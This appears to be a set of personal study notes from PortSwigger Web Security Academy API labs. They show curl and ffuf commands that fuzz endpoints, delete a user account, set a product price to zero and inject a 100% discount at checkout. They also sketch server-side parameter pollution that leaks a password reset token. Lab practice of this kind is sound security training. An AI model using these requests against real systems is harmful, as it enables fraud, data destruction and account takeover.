____

```bash
ffuf -w content.txt -u https://0a6d001d0357c03183baaa2600fe0023.web-security-academy.net/FUZZ
```

```bash
curl https://0a6d001d0357c03183baaa2600fe0023.web-security-academy.net/api/user/carlos -X DELETE -H  
'Cookie: session=wBQWoe4x6dke6hWYkh4WO0EQ9Hs2fXSY'
```



____

To change the content type, modify the `Content-Type` header, then reformat the request body accordingly. You can use the Content type converter BApp to automatically convert data submitted within requests between XML and JSON.

```bash
curl -X PATCH https://0a8200d403af68b280a4307f00cc0063.web-security-academy.net/api/products/1/pric  
e -d '{"price":0}' -H 'Cookie: session=lzNDDGErMDObJ2YNiFeCYWPcrGi4en9m' -H 'Content-Type: application/json'
```

___

```bash
curl -X POST https://0a88007104bb78eb82061ac200d600e9.web-security-academy.net/api/checkout -H 'Coo  
kie: session=5ruUmRzO6InKX10BeH9MhoKEPxCSXjqC' -H 'Content-Type: application/json' -d '{"chosen_products":[{"product_id":"1",  
"quantity":1}],"chosen_discount":{"percentage":100}}' -i
```

____
### server-side parameter pollution

Place query syntax characters like `#`, `&`, and `=` in your input and observe how the application responds

![[Pasted image 20250123184928.png]]

![[Pasted image 20250123185101.png]]

`field=email`is a valid field 
`field=reset_token`

![[Pasted image 20250123185534.png]]

```
/forgot-password?reset_token=94j01pbswpftpxe8a3y8wrpv43uhk41e
```

___



